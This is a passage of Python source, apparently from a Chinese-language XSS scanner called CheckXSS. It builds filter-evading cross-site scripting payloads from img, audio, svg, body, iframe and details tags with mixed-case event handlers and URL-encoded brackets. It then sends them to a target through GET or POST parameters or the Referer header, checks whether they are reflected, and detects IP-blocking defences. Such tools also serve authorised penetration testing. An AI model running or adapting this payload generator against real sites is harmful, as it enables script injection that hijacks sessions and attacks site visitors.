                            str592 + "<ImG" + "/" + "src=x" + "/" + "OnErrOr=" + urldata.unsensitive['action'][0] + ">")
                    elif re.search(re.escape("img"), e1, re.IGNORECASE) and re.search(re.escape("src"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE) and re.search(re.escape("onerror"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 + "<ImG" + " " + "src=x" + " " + "OnErrOr=" + urldata.unsensitive['action'][0] + ">")

                    if re.search(re.escape("audio"), e1, re.IGNORECASE) and re.search(re.escape("src"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE) and re.search(re.escape("onerror"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 + "<AuDiO" + "/" + "src=x" + "/" + "OnErrOr=" + urldata.unsensitive['action'][0] + ">")
                    elif re.search(re.escape("audio"), e1, re.IGNORECASE) and re.search(re.escape("src"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE) and re.search(re.escape("onerror"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 + "<AuDiO" + " " + "src=x" + " " + "OnErrOr=" + urldata.unsensitive['action'][0] + ">")

                    if re.search(re.escape("details"), e1, re.IGNORECASE) and re.search(re.escape("ontoggle"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 + "<DeTaIlS" + "/" + "oNToGgle=" + urldata.unsensitive['action'][0] + ">")
                    elif re.search(re.escape("details"), e1, re.IGNORECASE) and re.search(re.escape("ontoggle"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 + "<DeTaIlS" + " " + "oNToGgle=" + urldata.unsensitive['action'][0] + ">")

                    if re.search(re.escape("body"), e1, re.IGNORECASE) and re.search(re.escape("onload"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 + "<BoDy" + "/" + "oNLoAd=" + urldata.unsensitive['action'][0] + ">")
                    elif re.search(re.escape("body"), e1, re.IGNORECASE) and re.search(re.escape("onload"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 + "<BoDy" + " " + "oNLoAd=" + urldata.unsensitive['action'][0] + ">")

                    if re.search(re.escape("svg"), e1, re.IGNORECASE) and re.search(re.escape("onload"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 + "<SvG" + "/" + "oNLoAd=" + urldata.unsensitive['action'][0] + ">")
                    elif re.search(re.escape("svg"), e1, re.IGNORECASE) and re.search(re.escape("onload"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 + "<SvG" + " " + "oNLoAd=" + urldata.unsensitive['action'][0] + ">")

                    if re.search(re.escape("iframe"), e1, re.IGNORECASE) and re.search(re.escape("onload"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 + "<IfrAme" + "/" + "oNLoAd=" + urldata.unsensitive['action'][0] + ">")
                    elif re.search(re.escape("iframe"), e1, re.IGNORECASE) and re.search(re.escape("onload"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 + "<IfrAme" + " " + "oNLoAd=" + urldata.unsensitive['action'][0] + ">")

                    ### 用/代替空格

                    # if re.search(re.escape("input"), e1, re.IGNORECASE):
                    #     payload.keyword['combination_close_yes'].append(
                    #         str592+"<iNpUt"+"/"+urldata.unsensitive['onevent'][0].replace("591", "")+urldata.unsensitive['action'][0]+">")
                    #
                    # if re.search(re.escape("textarea"), e1, re.IGNORECASE):
                    #     payload.keyword['combination_close_yes'].append(
                    #         str592+"<teXtaReA"+"/"+urldata.unsensitive['onevent'][0].replace("591", "")+urldata.unsensitive['action'][0]+">")

                    # if re.search(re.escape("select"), e1, re.IGNORECASE):
                    #     payload.keyword['combination_close_yes'].append(
                    #         str592+"<select"+"/"+urldata.unsensitive['onevent'][0].replace("591", "")+urldata.unsensitive['action'][0]+">")

                    # if re.search(re.escape("video"), e1, re.IGNORECASE)and re.search(re.escape("onerror"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                    #     payload.keyword['combination_close_yes'].append(
                    #         str592 + "<video><source" + "/" + "oNErroR=" +urldata.unsensitive['action'][0] + ">")

                    # if re.search(re.escape("img"), e1, re.IGNORECASE) and re.search(re.escape("src"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE) and re.search(re.escape("onerror"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                    #     payload.keyword['combination_close_yes'].append(
                    #         str592 + "<ImG" + "/" + "src=x" + "/" + "OnErrOr=" + urldata.unsensitive['action'][0] + ">")

                    # if re.search(re.escape("audio"), e1, re.IGNORECASE) and re.search(re.escape("src"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE) and re.search(re.escape("onerror"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                    #     payload.keyword['combination_close_yes'].append(
                    #         str592 + "<AuDiO" + "/" + "src=x" + "/" + "OnErrOr=" + urldata.unsensitive['action'][0] + ">")
                    #
                    # if re.search(re.escape("details"), e1, re.IGNORECASE) and re.search(re.escape("ontoggle"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                    #     payload.keyword['combination_close_yes'].append(
                    #         str592 + "<DeTaIlS" + "/" + "oNToGgle=" + urldata.unsensitive['action'][0] + ">")
                    #
                    # if re.search(re.escape("body"), e1, re.IGNORECASE) and re.search(re.escape("onload"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                    #     payload.keyword['combination_close_yes'].append(
                    #         str592 + "<BoDy" + "/" + "oNLoAd=" + urldata.unsensitive['action'][0] + ">")

                    # if re.search(re.escape("svg"), e1, re.IGNORECASE) and re.search(re.escape("onload"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                    #     payload.keyword['combination_close_yes'].append(
                    #         str592 + "<SvG" + "/" + "oNLoAd=" + urldata.unsensitive['action'][0] + ">")
                    #
                    # if re.search(re.escape("iframe"), e1, re.IGNORECASE) and re.search(re.escape("onload"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                    #     payload.keyword['combination_close_yes'].append(
                    #         str592 + "<IfrAme" + "/" + "oNLoAd=" + urldata.unsensitive['action'][0] + ">")
                except:
                    pass

            if ">" not in "".join(urldata.unsensitive['close']) and "%3e" in "".join(urldata.unsensitive['close']):
                payload.keyword['combination_close_yes'] = format.payloadReplace(payload.keyword['combination_close_yes'], ">", "%3e")
            if "<" not in "".join(urldata.unsensitive['close']) and "%3c" in "".join(urldata.unsensitive['close']):
                payload.keyword['combination_close_yes'] = format.payloadReplace(payload.keyword['combination_close_yes'], "<", "%3c")
            if ">" not in "".join(urldata.unsensitive['close']) and "%3e" not in "".join(urldata.unsensitive['close']):
                payload.keyword['combination_close_yes'] = format.payloadReplace(payload.keyword['combination_close_yes'], ">", "%20")


            print("\n\033[1;34;8m[!] payload 生成（可能需要使用 BurpSuite URL解码）: \033[0m\n")
            for erer in payload.keyword['combination_close_yes']:
                print("[!] ",erer)
                # time.sleep(0.1)

            if len(payload.keyword['combination_close_yes']) == 0:
                print("无可用 Payload! ")
                return

            while urldata.HTTP_METHON == "GET":
                def get_start(pd):
                    # debug

                    # print(pd)
                    # print("urllib.parse.unquote(pd):" + urllib.parse.unquote(pd))
                    # # print("urllib.parse.unquote(urllib.parse.unquote(pd)))"+urllib.parse.unquote(urllib.parse.unquote(pd)))
                    # print("after re.escape" + re.escape(urllib.parse.unquote(urllib.parse.unquote(pd))))
                    if re.search(
                            re.escape(
                                urllib.parse.unquote(
                                    urllib.parse.unquote(pd))).replace("\ ", ".*"),
                            PreCheck.get_response(
                                self,
                                re.sub(
                                    re.escape("abcdef1234"),
                                    pd,
                                    urldata.get_url),urldata.verbose)):  # 使用 re.escape()

                        urldata.unsensitive['combination_close_yes'].append(pd)
                        print("\n\033[1;32;8mPayload：\033[0m" + re.sub(re.escape("abcdef1234"), pd, urldata.get_url))
                    else:
                        urldata.sensitive['combination_close_yes'].append(pd)

                for i in payload.keyword['combination_close_yes']:
                    mythread = threading.Thread(target=get_start(i))
                    mythread.start()

                # print("\n"+"[!] 自动验证完成")
                print("\n[!] 自动验证可能存在误差，" + "\033[1;32;8m请利用以上 payload 做人工测试！\033[0m")
                print("\n")
                # for e in urldata.unsensitive['combination_close_yes']:
                #     print("\n\033[1;32;8mPayload：\033[0m"+re.sub(re.escape("abcdef1234"), e, urldata.get_url))
                #     time.sleep(0.1)

                break

            ### 还未找到实例测试 POST

            while urldata.HTTP_METHON == "POST":
                def post_start(pd):
                    #debug
                    # print(pd)
                    # print("urllib.parse.unquote(pd):"+urllib.parse.unquote(pd))
                    # print("after re.escape"+re.escape(urllib.parse.unquote(urllib.parse.unquote(pd))))
                    if re.search(
                            re.escape(
                                urllib.parse.unquote(
                                    urllib.parse.unquote(pd))).replace("\ ", ".*"),
                            PreCheck.post_response(
                                self,
                                re.sub(
                                    re.escape("abcdef1234"),
                                    pd,
                                    urldata.post_data),urldata.verbose)):  # 使用 re.escape()

                        urldata.unsensitive['combination_close_yes'].append(pd)
                        print("\n\033[1;32;8mPayload：\033[0m",
                              "(POST)" + re.sub(re.escape("abcdef1234"), pd, urldata.post_data))
                    else:
                        urldata.sensitive['combination_close_yes'].append(pd)

                for i in payload.keyword['combination_close_yes']:
                    mythread = threading.Thread(target=post_start(i))
                    mythread.start()

                print("\n[!] 自动验证可能存在误差，" + "\033[1;32;8m请利用以上 payload 做人工测试！\033[0m")
                print("\n")
                # for e in urldata.unsensitive['combination_close_yes']:
                #     print("\n\033[1;32;8mPayload：\033[0m" , "(POST)" + re.sub(re.escape("abcdef1234"), e, urldata.post_data))
                #     time.sleep(0.1)

                break

            while urldata.HTTP_METHON == "REFERER":
                def referer_start(pd):
                    #debug
                    # print(pd)
                    # print("urllib.parse.unquote(pd):"+urllib.parse.unquote(pd))
                    # print("after re.escape"+re.escape(urllib.parse.unquote(urllib.parse.unquote(pd))))
                    if re.search(
                            re.escape(
                                urllib.parse.unquote(
                                    urllib.parse.unquote(pd))).replace("\ ", ".*"),
                            PreCheck.referer_response(
                                self,pd,urldata.verbose)):  # 使用 re.escape()

                        urldata.unsensitive['combination_close_yes'].append(pd)
                        print("\n\033[1;32;8mPayload：\033[0m", "(Referer)",  pd)
                    else:
                        urldata.sensitive['combination_close_yes'].append(pd)

                for i in payload.keyword['combination_close_yes']:
                    mythread = threading.Thread(target=referer_start(i))
                    mythread.start()

                # print("\n"+"[!] 自动验证完成")
                print("\n[!] 自动验证可能存在误差，"+"\033[1;32;8m请利用以上 payload 做人工测试！\033[0m")
                print("\n")
                # for e in urldata.unsensitive['combination_close_yes']:
                #     print("\n\033[1;32;8mPayload：\033[0m", "(Referer)", + e )
                #     time.sleep(0.1)

                break


### 再测试一次闭合字符串，如果和第一次不一样，就会输出可能存在安全策略
    def checkurlaccessibleInTheEnd(self):
        format.breakline()
        print("[!] IP 封禁策略检测...")
        while len(urldata.unsensitive['close']) < 1:
            return
        self.security_strategy = 0
        while urldata.HTTP_METHON == "GET":
            def get_start(pd):
                if re.search(
                    re.escape(
                        urllib.parse.unquote(
                            urllib.parse.unquote(pd))),
                        PreCheck.get_response(
                            self,
                            re.sub(
                        re.escape("abcdef1234"),
                        pd,
                                urldata.get_url),urldata.verbose)):  # 使用 re.escape()
                    pass
                else:
                    self.security_strategy +=1
                    if self.security_strategy > 1:
                        print("\n"+'\033[1;32;8m[警告] 站点貌似存在安全策略封禁了本机出口 IP，可能因此造成误报! \033[0m')
                        print('\033[1;32;8m[警告] 站点貌似存在安全策略封禁了本机出口 IP，可能因此造成误报! \033[0m')
                        print('\033[1;32;8m[警告] 站点貌似存在安全策略封禁了本机出口 IP，可能因此造成误报! \033[0m')


            for i in urldata.unsensitive['close']:
                if self.security_strategy < 2:
                    get_start(i)
                else:
                    pass
            if self.security_strategy < 2:
                print("\n"+"[!] 不存在安全策略!")
            break

        while urldata.HTTP_METHON == "POST":

            def post_start(pd):
                if re.search(
                    re.escape(
                        urllib.parse.unquote(
                            urllib.parse.unquote(pd))),
                        PreCheck.post_response(
                            self,
                            re.sub(
                        re.escape("abcdef1234"),
                        i,
                                urldata.post_data),urldata.verbose)):  # 使用 re.escape()
                    pass
                else:
                    self.security_strategy += 1
                    if self.security_strategy > 1:
                        print("\n"+'\033[1;32;8m[警告] 站点貌似存在安全策略封禁了本机出口 IP，可能因此造成误报! \033[0m')
                        print('\033[1;32;8m[警告] 站点貌似存在安全策略封禁了本机出口 IP，可能因此造成误报! \033[0m')
                        print('\033[1;32;8m[警告] 站点貌似存在安全策略封禁了本机出口 IP，可能因此造成误报! \033[0m')

            for i in urldata.unsensitive['close']:
                if self.security_strategy < 2:
                    post_start(i)
                else:
                    pass
            if self.security_strategy < 2:
                print("\n"+"没发现有限制~")
            break


        while urldata.HTTP_METHON == "REFERER":
            def referer_start(pd):
                if re.search(
                        re.escape(
                            urllib.parse.unquote(
                                urllib.parse.unquote(pd))),
                        PreCheck.referer_response(
                            self,pd, urldata.verbose)):  # 使用 re.escape()
                    pass
                else:
                    self.security_strategy += 1
                    if self.security_strategy > 1:
                        print("\n"+'\033[1;32;8m[警告] 站点貌似存在安全策略封禁了本机出口 IP，可能因此造成误报! \033[0m')
                        print('\033[1;32;8m[警告] 站点貌似存在安全策略封禁了本机出口 IP，可能因此造成误报! \033[0m')
                        print('\033[1;32;8m[警告] 站点貌似存在安全策略封禁了本机出口 IP，可能因此造成误报! \033[0m')

            for i in urldata.unsensitive['close']:
                if self.security_strategy < 2:
                    referer_start(i)
                else:
                    pass
            if self.security_strategy < 2:
                print("\n"+"没发现有限制~")
            break

# ctrl 信号捕获函数
def exit_gracefully(signum, frame):
    # restore the original signal handler as otherwise evil things will happen
    # in raw_input when CTRL+C is pressed, and our signal handler is not re-entrant
    signal.signal(signal.SIGINT, original_sigint)

    try:
        raw_input("\n\033[1;34;8m[!] 暂停中，回车继续 > \033[0m")


    except KeyboardInterrupt:
        print("\n\033[1;34;8m[!] 正在退出... \033[0m")
        time.sleep(1)
        print("\n\033[1;34;8m[!] GoodBye！ \033[0m")
        os._exit(0)

    # restore the exit gracefully handler here
    signal.signal(signal.SIGINT, exit_gracefully)






if __name__ == "__main__":
    # ctrl+c 信号捕获
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)
    #*************************************************
    print("\n" + "         CheckXSS v2.0.1         ".rjust(37, " "), "\n")
    try:
        sys.argv[1]
    except IndexError:
        sys.argv.append('terminal mode')
    if sys.argv[1] == "-h":
        print("启动命令行工具：请输入'python checkxss.py' 然后按照提示输入待检测链接即可！")
        print("启动图形化工具：请输入'python checkxss.py -x " + "\n")
        print("举个栗子:\n")
        print("注入点在 GET 参数中，待检测链接输入：http://www.example.com/example.jsp?uid=1&sid=2 ")
        print("注入点在 POST 参数中，待检测链接输入：：http://www.example.com/example.jsp"+"\033[1;32;8m(POST)uid=1&sid=2\033[0m")
        print("注入点在 HTTP 请求头部 Referer 字段中，待检测链接输入：：http://www.example.com/example.jsp?uid=1&sid=2\033[1;32;8m(REFERER)\033[0m ")
        print("注入点在 HTTP 请求头部 Cookie 字段中，待检测链接输入：：http://www.example.com/example.jsp?uid=1&sid=2\033[1;32;8m(COOKIE)\033[0m \n")
        sys.exit(0)
    if sys.argv[1] == "-x":
        app = QApplication(sys.argv)  # the standard way to init QT
        myWin = MyMainWindow()
        myWin.show()
        sys.exit(app.exec_())
    else:

        checkxss = Worker()
        while True:
            checkxss.run()
